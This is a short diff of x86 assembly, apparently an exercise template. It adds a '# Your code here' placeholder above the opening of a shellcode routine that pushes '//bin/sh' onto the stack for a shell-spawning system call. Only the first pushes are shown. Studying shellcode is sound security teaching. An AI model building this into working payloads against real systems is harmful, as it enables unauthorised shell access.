@@ -6,6 +6,7 @@ _main:
 push    %ebp
 mov     %esp,%ebp
 
+# Your code here
 # Push //bin/sh as LE-ASCII string to stack and move pointer to start into %ebx
 pushl $0x00000000
 pushl $0x68732f6e
